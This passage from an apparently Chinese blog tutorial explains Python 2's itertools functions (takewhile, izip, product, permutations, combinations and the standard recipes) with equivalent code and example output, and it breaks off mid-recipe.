2</span><br><span class="line">i2: 3</span><br><span class="line">i2: 4</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-takewhile-predicate-iterable"><a href="#itertools-takewhile-predicate-iterable" class="headerlink" title="itertools.takewhile(predicate, iterable)"></a>itertools.takewhile(predicate, iterable)</h2><p>和dropwhile相反</p>
<p>创建一个迭代器，生成iterable中predicate(item)为True的项，只要predicate计算为False，迭代就会立即停止。</p>
<p>即：从序列的头开始, 直到执行函数func失败.<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def takewhile(predicate, iterable):</span><br><span class="line">    <span class="comment"># takewhile(lambda x: x&lt;5, [1,4,6,4,1]) --&gt; 1 4</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> predicate(x):</span><br><span class="line">            yield x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line">def should_take(x):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Testing:'</span>, x</span><br><span class="line">    <span class="built_in">return</span> (x&lt;2)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> takewhile(should_take, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Yielding:'</span>, i</span><br><span class="line"> </span><br><span class="line">Testing: -1</span><br><span class="line">Yielding: -1</span><br><span class="line">Testing: 0</span><br><span class="line">Yielding: 0</span><br><span class="line">Testing: 1</span><br><span class="line">Yielding: 1</span><br><span class="line">Testing: 2</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-izip-iterables"><a href="#itertools-izip-iterables" class="headerlink" title="itertools.izip(*iterables)"></a>itertools.izip(*iterables)</h2><p>返回一个合并了多个迭代器为一个元组的迭代器. 它类似于内置函数zip(), 只是它返回的是一个迭代器而不是一个列表</p>
<p>创建一个迭代器，生成元组(i1, i2, … iN)，其中i1，i2 … iN 分别来自迭代器iter1，iter2 … iterN，只要提供的某个迭代器不再生成值，迭代就会停止，此函数生成的值与内置的zip()函数相同。代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">izip(iter1, iter2, ... iterN):</span><br><span class="line">返回:(it1[0],it2 [0], it3[0], ..), (it1[1], it2[1], it3[1], ..)...</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">def izip(*iterables):</span><br><span class="line">    <span class="comment"># izip('ABCD', 'xy') --&gt; Ax By</span></span><br><span class="line">    iterators = map(iter, iterables)</span><br><span class="line">    <span class="keyword">while</span> iterators:</span><br><span class="line">        yield tuple(map(next, iterators))</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> izip([1, 2, 3], [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">(1, <span class="string">'a'</span>)</span><br><span class="line">(2, <span class="string">'b'</span>)</span><br><span class="line">(3, <span class="string">'c'</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-izip-longest-iterables-fillvalue"><a href="#itertools-izip-longest-iterables-fillvalue" class="headerlink" title="itertools.izip_longest(*iterables[, fillvalue])"></a>itertools.izip_longest(*iterables[, fillvalue])</h2><p>与izip()相同，但是迭代过程会持续到所有输入迭代变量iter1,iter2等都耗尽为止，如果没有使用fillvalue关键字参数指定不同的值，则使用None来填充已经使用的迭代变量的值。<br>代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class ZipExhausted(Exception):</span><br><span class="line">    pass</span><br><span class="line">   </span><br><span class="line">def izip_longest(*args, **kwds):</span><br><span class="line">    <span class="comment"># izip_longest('ABCD', 'xy', fillvalue='-') --&gt; Ax By C- D-</span></span><br><span class="line">    fillvalue = kwds.get(<span class="string">'fillvalue'</span>)</span><br><span class="line">    counter = [len(args) - 1]</span><br><span class="line">    def sentinel():</span><br><span class="line">        <span class="keyword">if</span> not counter[0]:</span><br><span class="line">            raise ZipExhausted</span><br><span class="line">        counter[0] -= 1</span><br><span class="line">        yield fillvalue</span><br><span class="line">    fillers = repeat(fillvalue)</span><br><span class="line">    iterators = [chain(it, sentinel(), fillers) <span class="keyword">for</span> it <span class="keyword">in</span> args]</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">while</span> iterators:</span><br><span class="line">            yield tuple(map(next, iterators))</span><br><span class="line">    except ZipExhausted:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></p>
<h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><h2 id="itertools-product-iterables-repeat"><a href="#itertools-product-iterables-repeat" class="headerlink" title="itertools.product(*iterables[, repeat])"></a>itertools.product(*iterables[, repeat])</h2><p>笛卡尔积</p>
<p>创建一个迭代器，生成表示item1，item2等中的项目的笛卡尔积的元组，repeat是一个关键字参数，指定重复生成序列的次数。代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def product(*args, **kwds):</span><br><span class="line">    <span class="comment"># product('ABCD', 'xy') --&gt; Ax Ay Bx By Cx Cy Dx Dy</span></span><br><span class="line">    <span class="comment"># product(range(2), repeat=3) --&gt; 000 001 010 011 100 101 110 111</span></span><br><span class="line">    pools = map(tuple, args) * kwds.get(<span class="string">'repeat'</span>, 1)</span><br><span class="line">    result = [[]]</span><br><span class="line">    <span class="keyword">for</span> pool <span class="keyword">in</span> pools:</span><br><span class="line">        result = [x+[y] <span class="keyword">for</span> x <span class="keyword">in</span> result <span class="keyword">for</span> y <span class="keyword">in</span> pool]</span><br><span class="line">    <span class="keyword">for</span> prod <span class="keyword">in</span> result:</span><br><span class="line">        yield tuple(prod)</span><br><span class="line"></span><br><span class="line">例子代码如下:</span><br><span class="line">```bash	</span><br><span class="line">import itertools</span><br><span class="line">a = (1, 2, 3)</span><br><span class="line">b = (<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>)</span><br><span class="line">c = itertools.product(a,b)</span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> c:</span><br><span class="line">    <span class="built_in">print</span> elem</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">(1, <span class="string">'A'</span>)</span><br><span class="line">(1, <span class="string">'B'</span>)</span><br><span class="line">(1, <span class="string">'C'</span>)</span><br><span class="line">(2, <span class="string">'A'</span>)</span><br><span class="line">(2, <span class="string">'B'</span>)</span><br><span class="line">(2, <span class="string">'C'</span>)</span><br><span class="line">(3, <span class="string">'A'</span>)</span><br><span class="line">(3, <span class="string">'B'</span>)</span><br><span class="line">(3, <span class="string">'C'</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-permutations-iterable-r"><a href="#itertools-permutations-iterable-r" class="headerlink" title="itertools.permutations(iterable[, r])"></a>itertools.permutations(iterable[, r])</h2><p>排列</p>
<p>创建一个迭代器，返回iterable中所有长度为r的项目序列，如果省略了r，那么序列的长度与iterable中的项目数量相同： 返回p中任意取r个元素做排列的元组的迭代器<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def permutations(iterable, r=None):</span><br><span class="line">    <span class="comment"># permutations('ABCD', 2) --&gt; AB AC AD BA BC BD CA CB CD DA DB DC</span></span><br><span class="line">    <span class="comment"># permutations(range(3)) --&gt; 012 021 102 120 201 210</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    r = n <span class="keyword">if</span> r is None <span class="keyword">else</span> r</span><br><span class="line">    <span class="keyword">if</span> r &gt; n:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    indices = range(n)</span><br><span class="line">    cycles = range(n, n-r, -1)</span><br><span class="line">    yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices[:r])</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(r)):</span><br><span class="line">            cycles[i] -= 1</span><br><span class="line">            <span class="keyword">if</span> cycles[i] == 0:</span><br><span class="line">                indices[i:] = indices[i+1:] + indices[i:i+1]</span><br><span class="line">                cycles[i] = n - i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = cycles[i]</span><br><span class="line">                indices[i], indices[-j] = indices[-j], indices[i]</span><br><span class="line">                yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices[:r])</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span></span><br><span class="line">也可以用product实现</span><br><span class="line">  </span><br><span class="line">def permutations(iterable, r=None):</span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    r = n <span class="keyword">if</span> r is None <span class="keyword">else</span> r</span><br><span class="line">    <span class="keyword">for</span> indices <span class="keyword">in</span> product(range(n), repeat=r):</span><br><span class="line">        <span class="keyword">if</span> len(<span class="built_in">set</span>(indices)) == r:</span><br><span class="line">            yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-combinations-iterable-r"><a href="#itertools-combinations-iterable-r" class="headerlink" title="itertools.combinations(iterable, r)"></a>itertools.combinations(iterable, r)</h2><p>创建一个迭代器，返回iterable中所有长度为r的子序列，返回的子序列中的项按输入iterable中的顺序排序 (不带重复)代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def combinations(iterable, r):</span><br><span class="line">    <span class="comment"># combinations('ABCD', 2) --&gt; AB AC AD BC BD CD</span></span><br><span class="line">    <span class="comment"># combinations(range(4), 3) --&gt; 012 013 023 123</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    <span class="keyword">if</span> r &gt; n:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    indices = range(r)</span><br><span class="line">    yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(r)):</span><br><span class="line">            <span class="keyword">if</span> indices[i] != i + n - r:</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span></span><br><span class="line">        indices[i] += 1</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+1, r):</span><br><span class="line">            indices[j] = indices[j-1] + 1</span><br><span class="line">        yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def combinations(iterable, r):</span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    <span class="keyword">for</span> indices <span class="keyword">in</span> permutations(range(n), r):</span><br><span class="line">        <span class="keyword">if</span> sorted(indices) == list(indices):</span><br><span class="line">            yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-combinations-with-replacement-iterable-r"><a href="#itertools-combinations-with-replacement-iterable-r" class="headerlink" title="itertools.combinations_with_replacement(iterable, r)"></a>itertools.combinations_with_replacement(iterable, r)</h2><p>创建一个迭代器，返回iterable中所有长度为r的子序列，返回的子序列中的项按输入iterable中的顺序排序 (带重复)代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def combinations_with_replacement(iterable, r):</span><br><span class="line">    <span class="comment"># combinations_with_replacement('ABC', 2) --&gt; AA AB AC BB BC CC</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    <span class="keyword">if</span> not n and r:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    indices = [0] * r</span><br><span class="line">    yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(r)):</span><br><span class="line">            <span class="keyword">if</span> indices[i] != n - 1:</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span></span><br><span class="line">        indices[i:] = [indices[i] + 1] * (r - i)</span><br><span class="line">        yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br></pre></td></tr></table></figure></p>
<p>　　<br>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def combinations_with_replacement(iterable, r):</span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    <span class="keyword">for</span> indices <span class="keyword">in</span> product(range(n), repeat=r):</span><br><span class="line">        <span class="keyword">if</span> sorted(indices) == list(indices):</span><br><span class="line">            yield tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br></pre></td></tr></table></figure></p>
<h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>使用现有扩展功能<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">def take(n, iterable):</span><br><span class="line">    <span class="string">"Return first n items of the iterable as a list"</span></span><br><span class="line">    <span class="built_in">return</span> list(islice(iterable, n))</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">def tabulate(<span class="keyword">function</span>, start=0):</span><br><span class="line">    <span class="string">"Return function(0), function(1), ..."</span></span><br><span class="line">    <span class="built_in">return</span> imap(<span class="keyword">function</span>, count(start))</span><br><span class="line"> </span><br><span class="line">def consume(iterator, n):</span><br><span class="line">    <span class="string">"Advance the iterator n-steps ahead. If n is none, consume entirely."</span></span><br><span class="line">    <span class="comment"># Use functions that consume iterators at C speed.</span></span><br><span class="line">    <span class="keyword">if</span> n is None:</span><br><span class="line">        <span class="comment"># feed the entire iterator into a zero-length deque</span></span><br><span class="line">        collections.deque(iterator, maxlen=0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># advance to the empty slice starting at position n</span></span><br><span class="line">        next(islice(iterator, n, n), None)</span><br><span class="line"> </span><br><span class="line">def nth(iterable, n, default=None):</span><br><span class="line">    <span class="string">"Returns the nth item or a default value"</span></span><br><span class="line">    <span class="built_in">return</span> next(islice(iterable, n, None), default)</span><br><span class="line"> </span><br><span class="line">def quantify(iterable, pred=bool):</span><br><span class="line">    <span class="string">"Count how many times the predicate is true"</span></span><br><span class="line">    <span class="built_in">return</span> sum(imap(pred, iterable))</span><br><span class="line"> </span><br><span class="line">def padnone(iterable):</span><br><span class="line">    <span class="string">""</span><span class="string">"Returns the sequence elements and then returns None indefinitely.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    Useful for emulating the behavior of the built-in map() function.</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    <span class="built_in">return</span> chain(iterable, repeat(None))</span><br><span class="line"> </span><br><span class="line">def ncycles(iterable, n):</span><br><span class="line">    <span class="string">"Returns the sequence elements n times"</span></span><br><span class="line">    <span class="built_in">return</span> chain.from_iterable(repeat(tuple(iterable), n))</span><br><span class="line"> </span><br><span class="line">def dotproduct(vec1, vec2):</span><br><span class="line">    <span class="built_in">return</span> sum(imap(operator.mul, vec1, vec2))</span><br><span class="line"> </span><br><span class="line">def flatten(listOfLists):</span><br><span class="line">    <span class="string">"Flatten one level of nesting"</span></span><br><span class="line">    <span class="built_in">return</span> chain.from_iterable(listOfLists)</span><br><span class="line"> </span><br><span class="line">def repeatfunc(func, <span class="built_in">times</span>=None, *args):</span><br><span class="line">    <span class="string">""</span><span class="string">"Repeat calls to func with specified arguments.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    Example:  repeatfunc(random.random)</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">times</span> is None:</span><br><span class="line">        <span class="built_in">return</span> starmap(func, repeat(args))</span><br><span class="line">    <span class="built_in">return</span> starmap(func, repeat(args, <span class="built_in">times</span>))</span><br><span class="line"> </span><br><span class="line">def pairwise(iterable):</span><br><span class="line">    <span class="string">"s -&gt; (s0,s1), (s1,s2), (s2, s3), ..."</span></span><br><span class="line">    a, b = tee(iterable)</span><br><span class="line">    next(b, None)</span><br><span class="line">    <span class="built_in">return</span> izip(a, b)</span><br><span class="line"> </span><br><span class="line">def grouper(iterable, n, fillvalue=None):</span><br><span class="line">    <span class="string">"Collect data into fixed-length chunks or blocks"</span></span><br><span class="line">    <span class="comment"># grouper('ABCDEFG', 3, 'x') --&gt; ABC DEF Gxx</span></span><br><span class="line">    args = [iter(iterable)] * n</span><br><span class="line">    <span class="built_in">return</span> izip_longest(fillvalue=fillvalue, *args)</span><br><span class="line"> </span><br><span class="line">def roundrobin(*iterables):</span><br><span class="line">    <span class="string">"roundrobin('ABC', 'D', 'EF') --&gt; A D E B F C"</span></span><br><span class="line">    <span class="comment"># Recipe credited to George Sakkis</span></span><br><span class="line">    pending = len(iterables)</span><br><span class="line">    nexts = cycle(iter(it).next <span class="keyword">for</span> it <span class="keyword">in</span> iterables)</span><br><span class="line">    <span class="keyword">while</span> pending:</span><br><span class="line">        try:</span><br><span class="line">            <span class="keyword">for</span> next <span class="keyword">in</span> nexts:</span><br><span class="line">                yield next()</span><br><span class="line">        except StopIteration:</span><br><span class="line">            pending -= 1</span><br><span class="line">            nexts = cycle(islice(nexts, pending))</span><br><span class="line"> </span><br><span class="line">def powerset(iterable):</span><br><span class="line">    <span class="string">"powerset([1,2,3]) --&gt; () (1,) (2,) (3,) (1,2) (1,3) (2,3) (1,2,3)"</span></span><br><span class="line">    s = list(iterable)</span><br><span class="line">    <span class="built_in">return</span> chain.from_iterable(combinations(s, r) <span class="keyword">for</span> r <span class="keyword">in</span> range(len(s)+1))</span><br><span class="line"> </span><br><span class="line">def unique_everseen(iterable, key=None):</span><br><span class="line">    <span class="string">"List unique elements, preserving order. Remember all elements ever seen."</span></span><br><span class="line">    <span class="comment"># unique_everseen('AAAABBBCCDAABBB') --&gt; A B C D</span></span><br><span class="line">    <span class="comment"># unique_everseen('ABBCcAD', str.lower) --&gt; A B C D</span></span><br><span class="line">    seen = <span class="built_in">set</span>()</span><br><span class="line">    seen_add = seen.add</span><br><span class="line">    <span class="keyword">if</span> key is None:</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> ifilterfalse(seen.__contains__, iterable):</span><br><span class="line">            seen_add(element)</span><br><span class="line">            yield element</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">            k = key(element)</span><br><span class="line">            <span class="keyword">if</span> k not <span class="keyword">in</span> seen:</span><br><span class="line">                seen_add(k)</span><br><span class="line">                yield element</span><br><span class="line"> </span><br><span class="line">def unique_justseen(iterable, key=None):</span><br><span class="line">    <span class="string">"List unique elements, preserving order. Remember only the element just seen."</span></span><br><span class="line">    <span class="comment"># unique_justseen('AAAABBBCCDAABBB') --&gt; A B C D A B</span></span><br><span class="line">    <span class="comment"># unique_justseen('ABBCcAD', str.lower) --&gt; A B C A D</span></span><br><span class="line">    <span class="built_in">return</span> imap(next, imap(itemgetter(1), groupby(iterable, key)))</span><br><span class="line"> </span><br><span class="line">def iter_except(func, exception, first=None):</span><br><span class="line">    <span class="string">""</span><span class="string">" Call a function repeatedly until an exception is raised.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    Converts a call-until-exception interface to an iterator interface.</span></span><br><span class="line"><span class="string">    Like __builtin__.iter(func, sentinel) but uses an exception instead</span></span><br><span class="line"><span class="string">    of a sentinel to end the loop.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    Examples:</span></span><br><span class="line"><span class="string">        bsddbiter = iter_except(db.next, bsddb.error, db.first)</span></span><br><span class="line"><span class="string">        heapiter = iter_except(functools.partial(heappop, h), IndexError)</span></span><br><span class="line"><span class="string">        dictiter = iter_except(d.popitem, KeyError)</span></span><br><span class="line"><span class="string">        dequeiter = iter_except(d.popleft, IndexError)</span></span><br><span class="line"><span class="string">        queueiter = iter_except(q.get_nowait, Queue.Empty)</span></span><br><span class="line"><span class="string">        setiter = iter_except(s.pop, KeyError)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> first is not None:</span><br><span class="line">            yield first()</span><br><span class="line">        <span class="keyword">while</span> 1:</span><br><span class="line">            yield func()</span><br><span class="line">    except exception:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line">def random_product(*args, **kwds):</span><br><span class="line">    <span class="string">"Random selection from itertools.product(*args, **kwds)"</span></span><br><span class="line">    pools = map(tuple, args) * kwds.get(<span class="string">'repeat'</span>, 1)</span><br><span class="line">    <span class="built_in">return</span> tuple(random.choice(pool) <span class="keyword">for</span> pool <span class="keyword">in</span> pools)</span><br><span class="line"> </span><br><span class="line">def random_permutation(iterable, r=None):</span><br><span class="line">    <span class="string">"Random selection from itertools.permutations(iterable, r)"</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    r = len(pool) <span class="keyword">if</span> r is None <span class="keyword">else</span> r</span><br><span class="line">    <span class="built_in">return</span> tuple(random.sample(pool, 